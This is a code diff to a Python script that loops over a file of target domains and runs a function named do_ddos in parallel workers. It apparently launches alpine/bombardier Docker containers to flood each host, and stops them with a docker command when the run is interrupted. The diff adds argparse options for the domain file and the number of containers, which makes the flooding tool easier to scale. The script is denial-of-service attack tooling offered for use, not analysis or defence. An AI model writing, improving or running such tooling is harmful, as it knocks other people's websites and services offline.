@@ -1,6 +1,6 @@
+import argparse
 import os
 import subprocess
-import sys
 from multiprocessing.pool import Pool
 
 INTERVAL_BETWEEN_PING = '10m'
@@ -15,14 +15,15 @@ HEADERS = """
 
 
 def main():
-    hosts_file_name = _parse_argv()
-    hosts = _hosts_from_file(hosts_file_name)
+    args = _parse_args()
+    hosts = _hosts_from_file(args.file)
+    workers = args.workers or len(hosts)
     while True:
         try:
-            with Pool(len(hosts)) as tp:
+            with Pool(int(workers)) as tp:
                 tp.map(do_ddos, hosts)
         except KeyboardInterrupt:
-            os.system('docker kill $(docker ps -q)')
+            os.system('docker rm $(docker stop $(docker ps -a -q --filter ancestor=alpine/bombardier --format="{{.ID}}"))')
             raise
 
 
@@ -49,8 +50,14 @@ def do_ddos(host):
         os.system(command)
 
 
-def _parse_argv():
-    return sys.argv[-1]
+def _parse_args():
+    parser = argparse.ArgumentParser()
+
+    parser.add_argument('--file', help='file with domains names')
+    parser.add_argument('--workers', help='Number of created containers')
+
+    args = parser.parse_args()
+    return args
 
 
 def _hosts_from_file(hosts_file_name):
